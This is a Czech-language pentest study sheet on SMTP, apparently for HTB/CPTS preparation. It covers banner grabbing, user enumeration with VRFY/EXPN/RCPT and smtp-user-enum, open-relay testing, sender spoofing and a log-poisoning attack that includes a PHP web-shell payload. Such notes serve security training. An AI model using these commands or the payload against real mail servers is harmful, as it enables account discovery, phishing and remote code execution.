# SMTP (Simple Mail Transfer Protocol) – Porty 25, 465, 587

SMTP je **textový protokol pro odesílání e-mailů**. Běží nad **TCP** a komunikuje pomocí příkazů podobně jako FTP nebo HTTP.

Bez šifrování lze komunikaci odposlechnout:

- uživatelé
- příkazy
- obsah zpráv

Šifrování:

- **STARTTLS**
- **SSL/TLS**

---

# SMTP Porty

|Port|Účel|
|---|---|
|25|Server-to-server komunikace|
|587|Odesílání mailů klientem (standard)|
|465|SMTP přes SSL|

---

# SMTP Enumerace

Cíl:

- zjistit verzi serveru
- najít uživatele
- zjistit konfiguraci

---

# Banner Grabbing

Připojení:

```
nc -nv TARGET 25
```

Příklad:

```
220 mail.htb ESMTP Postfix
```

Zjistíš:

- mail server
- software
- verzi

---

# User Enumeration

SMTP může prozradit existující účty.

---

## VRFY

Ověření uživatele:

```
VRFY admin
```

Odpověď:

```
250 User exists
```

nebo:

```
550 No such user
```

---

## EXPN

Rozbalení skupin:

```
EXPN admins
```

Může zobrazit členy skupiny.

---

## RCPT TO

Test existence uživatele:

```
MAIL FROM:test@test.com
RCPT TO:admin@domain.com
```

Odpověď může ukázat, jestli účet existuje.

---

# Automatizace Enumerace

## smtp-user-enum

VRFY:

```
smtp-user-enum \
-M VRFY \
-U users.txt \
-t TARGET
```

RCPT:

```
smtp-user-enum \
-M RCPT \
-U users.txt \
-t TARGET
```

---

## Metasploit

```
use auxiliary/scanner/smtp/smtp_enum
```

---

# SMTP Útoky

---

# 1. Open Relay

Chybná konfigurace SMTP serveru.

Umožní:

- posílat e-maily za server
- spam
- phishing

Test:

```
nmap -p25 --script smtp-open-relay TARGET
```

---

# 2. Mail Spoofing

SMTP samo o sobě neověřuje odesílatele.

Útočník může podvrhnout:

```
MAIL FROM:<admin@firma.cz>
```

Oběť vidí falešného odesílatele.

Ochrana:

- SPF
- DKIM
- DMARC

---

# 3. Log Poisoning (LFI → RCE)

Pokročilý útok.

Scénář:

```
SMTP
 |
 | vložení PHP kódu
 ↓
Mail Log
 |
 | LFI načte log
 ↓
Remote Code Execution
```

Příklad payloadu:

```
<?php system($_GET['cmd']); ?>
```

Poté:

- aplikace načte log
- PHP kód se vykoná

---

# SMTP Commands Cheat Sheet

|Příkaz|Funkce|
|---|---|
|`HELO/EHLO`|Zahájení komunikace|
|`VRFY`|Ověření uživatele|
|`EXPN`|Výpis skupin|
|`MAIL FROM`|Odesílatel|
|`RCPT TO`|Příjemce|
|`DATA`|Obsah e-mailu|
|`QUIT`|Ukončení|

---

# SMTP Pentest Checklist

☐ Port 25/465/587 otevřený  
☐ Banner grabbing  
☐ Verze SMTP serveru  
☐ VRFY povolené  
☐ EXPN povolené  
☐ User enumeration  
☐ Open relay test  
☐ Slabá konfigurace TLS  
☐ Citlivé informace v bannerech/logách

---

# HTB / CPTS SMTP Workflow

```
Nmap
 ↓
Port 25
 ↓
Banner Grab
 ↓
SMTP Commands
 ↓
User Enumeration
 ↓
Find Valid Accounts
 ↓
Password Attacks
 ↓
Mail Exploitation
 ↓
Initial Access
```

---

# Nejčastější SMTP nálezy

|Finding|Dopad|
|---|---|
|User enumeration|Odhalení účtů|
|Open relay|Phishing/spam|
|Weak credentials|Account takeover|
|Plaintext SMTP|Únik dat|
|Informativní banner|Únik informací|